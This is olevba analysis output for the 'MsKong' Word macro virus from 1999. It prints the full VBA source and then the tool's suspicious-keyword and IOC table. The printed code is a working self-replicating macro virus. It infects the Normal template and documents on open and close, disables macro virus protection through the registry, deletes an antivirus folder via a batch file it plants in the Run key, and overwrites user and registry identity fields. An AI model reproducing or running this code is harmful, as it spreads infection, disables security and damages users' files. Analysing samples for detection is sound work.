olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.MsKong-3f8cc2483374dae9e81085adc0302f6c39bf8b98
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.MsKong-3f8cc2483374dae9e81085adc0302f6c39bf8b98 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MsKong.bas 
in file: Virus.MSWord.MsKong-3f8cc2483374dae9e81085adc0302f6c39bf8b98 - OLE stream: 'Macros/VBA/MsKong'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public File As Variant, Tempat As String
Public Const FileKing As String = "MsKong.dll"
Public Const FileKong As String = "MsKong.dot"
Sub AutoOpen()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
Dim NT As Object
On Error Resume Next
    Application.Caption = "Microba Word"
    ActiveWindow.Caption = ActiveDocument
    Application.DisplayStatusBar = True
    Application.ScreenUpdating = False
    Application.EnableCancelKey = 0
    Set NT = NormalTemplate
    Set File = NT
    Periksa File
    Register
    If Application.UserName <> "King Of Kong" Then
    With Application
        .UserName = "King Of Kong"
        .UserInitials = "Kong"
        .UserAddress = "Planet Earth"
    End With
    End If
    TularGlobal
    Application.ScreenUpdating = True
    Options.VirusProtection = False
    CommandBars("Help").Controls("WordPerfect Help...").Enabled = False
    Application.DisplayStatusBar = False
End Sub
Function Kena(NamaFile$, Lokasi$)
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
    Kena = False
    SetAttr NamaFile$, vbNormal
    With Application.FileSearch
        .FileName = NamaFile$
        .LookIn = Lokasi$
        .Execute
        i = .FoundFiles.Count
        If i <> 0 Then Kena = True
    End With
    SetAttr NamaFile$, vbHidden + vbReadOnly
End Function
Sub ToolsMacro()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
Ulang:
Application.DisplayStatusBar = True
Dim X
ReDim ComboBox1__$(2)
    ComboBox1__$(0) = "AddYeOleInsertVisioDrawingButton"
    ComboBox1__$(1) = "AddYeOleInsertVisioDrawingMacro"
    ComboBox1__$(2) = "InsertVisioDrawing"
ReDim ListBox1__$(0)
    ListBox1__$(0) = ""
ReDim DropListBox2__$(3)
    Data = Left(ActiveDocument, Len(ActiveDocument) - 4)
    DropListBox2__$(0) = "All active templates and documents"
    DropListBox2__$(1) = "Normal.dot (global template)"
    DropListBox2__$(2) = "Word commands"
    DropListBox2__$(3) = Data & " (Document)"

    WordBasic.BeginDialog 600, 290, "Macro"
        WordBasic.PushButton 445, 23, 141, 21, "&Run", "Definierbar2"
        WordBasic.CancelButton 445, 47, 141, 21
        WordBasic.PushButton 445, 80, 141, 21, "&Step Info", "definierbar3"
        WordBasic.PushButton 445, 103, 141, 21, "&Edit", "Definierbar4"
        WordBasic.PushButton 445, 137, 141, 21, "&Create", "Definierbar5"
        WordBasic.PushButton 445, 160, 141, 21, "&Delete", "Definierbar6"
        WordBasic.PushButton 445, 185, 141, 21, "Or&ganizer...", "Definierbar7"
        WordBasic.TextBox 9, 22, 420, 20, "Kong2$"
        WordBasic.ListBox 20, 42, 410, 155, ComboBox1__$(), "ComboBox1"
        WordBasic.Text 9, 6, 93, 13, "&Macro Name:", "Text1"
        WordBasic.Text 9, 205, 75, 13, "M&acros In:", "Text2"
        WordBasic.Text 9, 230, 109, 13, "Descr&iption:", "Text3"
        WordBasic.TextBox 9, 245, 421, 35, "Kong$"
        WordBasic.DropListBox 85, 204, 343, 60, DropListBox2__$(), "ListBox2"
        WordBasic.Text 445, 205, 150, 13, "__________________"
        WordBasic.Text 445, 220, 150, 13, "    Copyright " & Chr(169) & " 1999"
        WordBasic.Text 445, 233, 150, 13, "Design by King of Kong"
        WordBasic.Text 445, 246, 150, 13, "        Planet Elektro"
        WordBasic.Text 445, 260, 150, 13, "Universitas Bung Hatta"
        WordBasic.Text 445, 271, 150, 13, Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151)
    WordBasic.EndDialog

Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
    Let dlg.Kong2$ = ComboBox1__$(0)
    Let dlg.Kong$ = "Macro created 18/07/99 by K&K"
    X = WordBasic.Dialog.UserDialog(dlg)
    Select Case X
        Case 0
            WordBasic.Cancel
        Case 1
            Tampil
            GoTo Ulang
        Case 2
            EditProperties
            With Assistant.NewBalloon
                .Animation = msoAnimationListensToComputer
                .Heading = "What would you like to do"
                .Text = "Shhht............"
                .Icon = msoIconTip
                .Show
            End With
            GoTo Ulang
            GoTo Ulang
        Case 3
            With Assistant.NewBalloon
                .Animation = msoAnimationThinking
                .Heading = "What would you like to do"
                .Text = "I don't know what you mean"
                .Icon = msoIconAlert
                .Show
            End With
            GoTo Ulang
        Case 4
            With Assistant.NewBalloon
                .Animation = msoAnimationSearching
                .Heading = "What would you like to do"
                .Text = "Sorry buddy, I can help You"
                .Icon = msoIconTip
                .Show
            End With
            GoTo Ulang
        Case 5
            With Assistant.NewBalloon
                .Animation = msoAnimationEmptyTrash
                .Heading = "What would you like to do"
                .Text = "Are you sure ?"
                .Icon = msoIconTip
                .Show
            End With
            GoTo Ulang
        Case 6
            With Assistant.NewBalloon
                .Animation = msoAnimationCheckingSomething
                .Heading = "What would you like to do"
                .Text = "Organizer ? ........"
                .Icon = msoIconTip
                .Show
            End With
            GoTo Ulang
    End Select
Application.DisplayStatusBar = False
End Sub
Sub FileSave()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
    Application.DisplayStatusBar = True
    Application.ScreenUpdating = False
    TularFile
    EditProperties
    Application.ScreenUpdating = True
    ActiveDocument.Save
    Application.DisplayStatusBar = False
End Sub
Sub Tampil()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
' Walaupun harus bekerja keras yang penting suskes!!
' Dibuat Hari Senin, 28 Juni 1999 selesai 29 Juni 1999

Dim Spasi$, MyName$
Dim King, Kong, Ulang, Waktu, MyDate, MyTime
Dim Hitung, Hitungi, Tanggal, Bulan
Dim Data$(9), MyValue
On Error Resume Next
    Application.DisplayStatusBar = True
    Tanggal = Day(Date)
    Bulan = Month(Date)
    If Tanggal = 2 And Bulan = 8 Then
        MyValue = 8 ' Spesial Value
        JenisHuruf = "Symbol"
        Warna = 6
        Warna2 = 5
        Warna3 = 2
        AnimasiHuruf = 3
        Huruf = "i"
        Huruf2 = "o"
        Huruf3 = "u"
        HurufBaru = "i"
        HurufBaru2 = "©"
        HurufBaru3 = "u"
        Ukuran = 20
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf, HurufBaru, Ukuran, Tanggal
        Animasi JenisHuruf, Warna2, AnimasiHuruf, Huruf2, HurufBaru2, Ukuran, Tanggal
        Animasi JenisHuruf, Warna3, AnimasiHuruf, Huruf3, HurufBaru3, Ukuran, Tanggal
    ElseIf Tanggal = 16 And Bulan = 8 Then
        MyValue = 9
        JenisHuruf = "Symbol"
        Warna = 0
        AnimasiHuruf = 0
        Huruf = "a"
        Huruf2 = "c"
        Huruf3 = "r"
        HurufBaru = "@"
        HurufBaru2 = "©"
        HurufBaru3 = "®"
        Ukuran = 0
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf, HurufBaru, Ukuran, Tanggal
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf2, HurufBaru2, Ukuran, Tanggal
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf3, HurufBaru3, Ukuran, Tanggal
    ElseIf Tanggal = 29 And Bulan = 2 Then
        MyValue = 0
        JenisHuruf = "Symbol"
        Warna = 6
        Warna2 = 5
        Warna3 = 2
        AnimasiHuruf = 3
        Huruf = "k"
        Huruf2 = "o"
        Huruf3 = "l"
        Huruf4 = "u"
        HurufBaru = "k"
        HurufBaru2 = "o"
        HurufBaru3 = "©"
        HurufBaru4 = "u"
        Ukuran = 20
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf, HurufBaru, Ukuran, Tanggal
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf2, HurufBaru2, Ukuran, Tanggal
        Animasi JenisHuruf, Warna2, AnimasiHuruf, Huruf3, HurufBaru3, Ukuran, Tanggal
        Animasi JenisHuruf, Warna3, AnimasiHuruf, Huruf4, HurufBaru4, Ukuran, Tanggal
    Else
    Randomize
    MyValue = Int((7 * Rnd) + 1)
    End If
    Spasi$ = "                                                                                                                                            "
    Data$(0) = "Long Live The Master"
    Data$(1) = "Planet Elektro - Universitas Bung Hatta"
    Data$(2) = "I'm a poor lonesome CowBoy and a long long way from home...."
    Data$(3) = "I'm a poor lonesome CowBoy and a long long way from Inel"
    Data$(4) = "The Truth Is Out There"
    Data$(5) = "Kong Beta 3, Copyright " & Chr(169) & " 1999, K&K Software Design " & Chr(153)
    Data$(6) = "Untuk Satri RX. yang ingin namanya dimasukkan"
    Data$(7) = "Untuk RNI, DonnYA, DNV mudah-mudahan sampai ke rumah!"
    Data$(8) = "Happy birthday to you...Happy birthday to you...Happy birthday dear Inel...Happy birthday to you"
    Data$(9) = "Happy birthday to you...Happy birthday to you...Happy birthday dear Yen...Happy birthday to you"
    DataAkhir$ = Data$(MyValue) + Left(Spasi$, Len(Spasi$) - Len(Data$(MyValue))) + Data$(MyValue)
    My$ = "Copyright " & Chr(169) & " 1999 K&K Software Design, Inc."
    Waktu = 70000  'Mudah - mudahan nggak kelamaan
    Kong = Len(Data$(MyValue))
    For Hitung = 0 To (Len(DataAkhir$) + 139)
        If Kong >= Len(DataAkhir$) Then
            Kong = Len(Data$(MyValue))
            Hitung = Len(DataAkhir$)
        End If
        
        If Hitung >= Len(DataAkhir$) Then
            Kong = Kong + 1
            MyName$ = Right$(DataAkhir$, Kong) + Right$(Spasi$, Len(Spasi$) - Len(Data$(MyValue)))
            WordBasic.PrintStatusBar MyName$
            Tunggu (Waktu)
        ElseIf Hitung < Len(DataAkhir$) Then
            MyName$ = Right$(DataAkhir$, Hitung)
            WordBasic.PrintStatusBar MyName$
            Tunggu (Waktu)
        End If
    Next Hitung

    Tunggu (10 * Waktu)
    For Ulang = 1 To 2
        King = 0
        MyName$ = DataAkhir$
        For Hitungi = 0 To (Len(DataAkhir$) - Len(Data$(MyValue)))
            MyName$ = Right$(DataAkhir$, (Len(DataAkhir$) - King))
            WordBasic.PrintStatusBar MyName$
            Tunggu (Waktu)
            King = King + 1
        Next Hitungi
    Next Ulang
    Tunggu (50 * Waktu)
    WordBasic.PrintStatusBar My$
    Application.DisplayStatusBar = False
End Sub
Private Sub Tunggu(Waktu)
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
' Sorry Tung, dari semua bagian dari macro ini
' Ente yang harus paling banyak kerja

    For Hitungan = 0 To Waktu
        Rem Harap tunggu sebentar
    Next Hitungan
End Sub
Sub FormatStyle()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

    Dialogs(180).Show
End Sub
Function EditProperties()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
With ActiveDocument
    .BuiltInDocumentProperties(1) = "The Truth Is Out There"
    .BuiltInDocumentProperties(2) = "Kong's Project"
    .BuiltInDocumentProperties(3) = "King of Kong"
    .BuiltInDocumentProperties(5) = "Planet Elektro" & Chr(13) & "Universitas Bung Hatta - Padang" & Chr(13) & "Sumatera Barat - Indonesia" & Chr(13) & "Terima kasih atas kerja samanya"
End With
End Function
Sub Periksa(KFile)
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
For Each Item In KFile.VBProject.VBComponents
    ThisDocu = KFile.VBProject.VBComponents(1).Name
    JumThisDocu = KFile.VBProject.VBComponents(1).CodeModule.CountOfLines
    If Item.Name = ThisDocu Then
        KFile.VBProject.VBComponents(1).CodeModule.DeleteLines 1, KFile.VBProject.VBComponents(1).CodeModule.CountOfLines
    ElseIf Item.Name <> "MsKong" Then
        Application.OrganizerDelete KFile.FullName, Item.Name, 3
    End If
Next Item
End Sub
Sub FileOpen()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

Dim AD As Object
On Error GoTo Gagal
    WordBasic.DisableAutoMacros True
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        Set AD = ActiveDocument
        Set File = AD
        Periksa File
        ActiveDocument.Save
        TularFile
    End If
    WordBasic.DisableAutoMacros False
Gagal:
End Sub
Sub AutoClose()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
    TularGlobal
    TularFile
    Tanggal = Day(Date)
    Bulan = Month(Date)
    If (Tanggal = 29 And Bulan = 2) Or (Tanggal = 2 And Bulan = 8) Or (Tanggal = 16 And Bulan = 8) Then
        Tampil
    End If
    ActiveDocument.Save
End Sub
Function Register()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
On Error Resume Next
    DefName = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefName")
    DefCompany = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefCompany")
    If (DefName <> "King of Kong" And DefCompany <> "K&K Software Design,Inc.") Then
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefName") = "King of Kong"
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefCompany") = "K&K Software Design,Inc."
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "King of Kong"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "K&K Software Design,Inc."
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
    End If
End Function
Function TularGlobal()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
On Error Resume Next
    Tempat$ = Options.DefaultFilePath(6)
    Tempat2$ = Options.DefaultFilePath(8)
    TargetFile$ = Tempat$ & "\" & FileKing$
    Cadangan$ = Tempat2$ & Application.PathSeparator & FileKong$
    Carrier$ = ActiveDocument.FullName
    Sumber$ = Left(Carrier$, Len(Carrier$) - 3) & "TMP"
    Sumber2$ = Left(Carrier$, Len(Carrier$) - 3) & "BAK"
    If (Not Kena(FileKing$, Tempat$) Or Not Kena(FileKong$, Tempat2$)) Then
        SetAttr Sumber$, vbNormal
        FileCopy Sumber2$, TargetFile$
        FileCopy Sumber$, Cadangan$
        SetAttr Sumber, vbReadOnly + vbHidden
        SetAttr TargetFile$, vbReadOnly
        SetAttr Cadangan$, vbReadOnly
        BacaTulisFile
    End If
End Function
Sub FileTemplates()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
    Dialogs(87).Show
End Sub
Function TularFile()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
On Error Resume Next
    Tempat$ = Options.DefaultFilePath(6)
    TargetFile$ = Tempat$ & Application.PathSeparator & FileKing$
    TargetFile2$ = Options.DefaultFilePath(8) & Application.PathSeparator & FileKong$
    DokumentAktif$ = ActiveDocument
    CarrierFile$ = Left(DokumentAktif$, Len(DokumentAktif$) - 3) & "TMP"
    CarrierFile2$ = Left(DokumentAktif$, Len(DokumentAktif$) - 3) & "BAK"
    Carrier$ = ActiveDocument.FullName
    LokasiFile$ = ActiveDocument.Path
    Sumber$ = LokasiFile$ & Application.PathSeparator & CarrierFile$
    Sumber2$ = LokasiFile$ & Application.PathSeparator & CarrierFile2$
    If Not Kena(CarrierFile$, LokasiFile$) Or Not Kena(CarrierFile2$, LokasiFile$) Then
        Selection.HomeKey Unit:=wdStory
        Selection.WholeStory
        Selection.Copy
        ActiveDocument.Save
        ActiveDocument.Close
        Kill Carrier$
        FileCopy TargetFile$, Carrier$
        FileCopy TargetFile$, Sumber2$
        FileCopy TargetFile2$, Sumber$
        SetAttr Carrier$, vbNormal
        SetAttr Sumber$, vbReadOnly + vbHidden
        SetAttr Sumber2$, vbReadOnly + vbHidden
        Documents.Open Carrier$
        Selection.Paste
        ActiveDocument.Save
    End If
End Function
Sub ToolsOptions()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
    Application.DisplayStatusBar = True
    With Options
        .SaveNormalPrompt = True
        .VirusProtection = True
        Dialogs(974).Show
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
    Application.DisplayStatusBar = False
End Sub
Sub BacaTulisFile()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
Tempat$ = Options.DefaultFilePath(8)
Target$ = Application.NormalTemplate.FullName
TargetFile$ = Tempat$ & "\" & FileKong$
Base$ = Options.DefaultFilePath(4)
If Base$ = "" Then
    Options.DefaultFilePath(4) = "C:\WINDOWS"
    Base$ = Options.DefaultFilePath(4)
End If
Parasit$ = "MsKong.Bat"
ParasitBase$ = Base$ & Application.PathSeparator & Parasit$
If Not Kena(Parasit$, Base$) Then
Open ParasitBase$ For Output As #1
    Print #1, "@Echo Off"
    Print #1, "Rem This Line For Master Kong"
    Print #1, "If Exist " & Chr(34) & "C:\Program Files\BanMacro\BanMacro.*" & Chr(34) & " Del " & Chr(34) & "C:\Program Files\BanMacro\BanMacro.*" & Chr(34) & " > nul "
    Print #1, "If Exist " & Chr(34) & TargetFile$ & Chr(34) & " Del " & Chr(34) & Target$ & Chr(34) & " > nul"
    Print #1, "If Exist " & Chr(34) & TargetFile$ & Chr(34) & " Copy " & Chr(34) & TargetFile & Chr(34) & " " & Chr(34) & Target$ & Chr(34) & " > nul"
    Print #1, "Attrib -r " & Chr(34) & Target$ & Chr(34) & " > nul"
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "LoadMe") = ParasitBase$
End If
End Sub
Sub Animasi(JenisHuruf, Warna, AnimasiHuruf, Huruf, HurufBaru, Ukuran, Tanggal)
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    If Tanggal <> 16 Then
        With Selection.Find.Replacement.Font
            If HurufBaru = "©" Then
                .Name = JenisHuruf
            End If
            .Size = Ukuran
            .ColorIndex = Warna
            .Animation = AnimasiHuruf
        End With
    End If
    With Selection.Find
        .Text = Huruf
        .Replacement.Text = HurufBaru
        .Forward = True
        .Wrap = 1
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=2
End Sub
Sub ViewVBCode()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
On Error Resume Next
    With Assistant.NewBalloon
        .Animation = msoAnimationGetTechy
        .Heading = "What would you like to do"
        .Text = "Sorry, Just For Einstein !"
        .Icon = msoIconTip
        .Show
    End With
    TularFile
    TularGlobal
    Tanggal = Day(Date)
    Bulan = Month(Date)
    If (Tanggal = 29 And Bulan = 2) Or (Tanggal = 2 And Bulan = 8) Or (Tanggal = 16 And Bulan = 8) Then
        Tampil
    End If
    ActiveDocument.Save
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Register            |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MsKong.dll          |Executable file name                         |
|IOC       |MsKong.Bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

